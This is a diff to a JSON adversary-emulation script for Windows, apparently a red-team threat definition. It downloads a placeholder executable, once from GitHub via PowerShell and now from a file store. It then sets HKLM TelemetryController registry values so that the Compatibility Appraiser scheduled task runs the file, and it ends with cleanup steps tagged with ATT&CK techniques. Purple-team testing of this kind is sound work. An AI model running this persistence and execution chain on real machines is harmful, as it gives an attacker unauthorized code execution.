@@ -7,47 +7,52 @@
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "--cp 127.0.0.1:443 --heartbeat 10 --multipart 10240 --secure true",
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
                 "module": "https",
                 "type": "initialization"
             },
             "1": {
+                "name": "REQUIRES",
+                "type": "assign",
+                "value": "LOCAL ADMIN"
+            },
+            "2": {
                 "module": "loader",
                 "module_to_load": "run",
                 "request": "--load run",
                 "type": "message"
             },
-            "2": {
+            "3": {
                 "module": "loader",
                 "module_to_load": "downloader",
                 "request": "--load downloader",
                 "type": "message"
             },
-            "3": {
+            "4": {
                 "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
                 "module": "controller",
                 "request": "--integrity",
                 "type": "message"
             },
-            "4": {
+            "5": {
                 "function": "ifelse",
-                "next": "18",
-                "step": "3",
+                "next": "19",
+                "step": "4",
                 "type": "decision",
                 "value": "High",
                 "verb": "does not contain"
             },
-            "5": {
-                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
-                "module": "run",
-                "request": "powershell -c \"Invoke-WebRequest -Uri 'https://github.com/scythe-jake/staging/blob/main/benign.exe' -OutFile \"C:\\Users\\Public\\benign.exe\"",
+            "6": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/common_x64/benign.exe --dest C:\\Users\\Public\\benign.exe",
                 "rtags": [
                     "att&ck-technique:T1071.001",
                     "att&ck-technique:T1059.001"
                 ],
                 "type": "message"
             },
-            "6": {
+            "7": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Command /t REG_SZ /d C:\\Users\\Public\\benign.exe",
@@ -57,7 +62,7 @@
                 ],
                 "type": "message"
             },
-            "7": {
+            "8": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Maintenance /t REG_DWORD /d 1",
@@ -67,7 +72,7 @@
                 ],
                 "type": "message"
             },
-            "8": {
+            "9": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Oobe /t REG_DWORD /d 1",
@@ -77,7 +82,7 @@
                 ],
                 "type": "message"
             },
-            "9": {
+            "10": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Nightly /t REG_DWORD /d 1",
@@ -87,7 +92,7 @@
                 ],
                 "type": "message"
             },
-            "10": {
+            "11": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c schtasks /run /tn \"\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser\"",
@@ -97,46 +102,66 @@
                 ],
                 "type": "message"
             },
-            "11": {
+            "12": {
                 "time": "300",
                 "type": "delay"
             },
-            "12": {
+            "13": {
                 "name": "Step",
                 "type": "assign",
                 "value": "Cleanup"
             },
-            "13": {
-                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
-                "module": "run",
-                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Command /f",
-                "type": "message"
-            },
             "14": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Maintenance /f",
+                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Command /f",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1112"
+                ],
                 "type": "message"
             },
             "15": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Oobe /f",
+                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Maintenance /f",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1112"
+                ],
                 "type": "message"
             },
             "16": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Nightly /f",
+                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Oobe /f",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1059.003"
+                ],
                 "type": "message"
             },
             "17": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "cmd.exe /c del C:\\Users\\Public\\benign.exe",
+                "request": "cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\POC\" /v Nightly /f",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1112"
+                ],
                 "type": "message"
             },
             "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\benign.exe",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "19": {
                 "module": "controller",
                 "request": "--shutdown",
                 "rtags": [
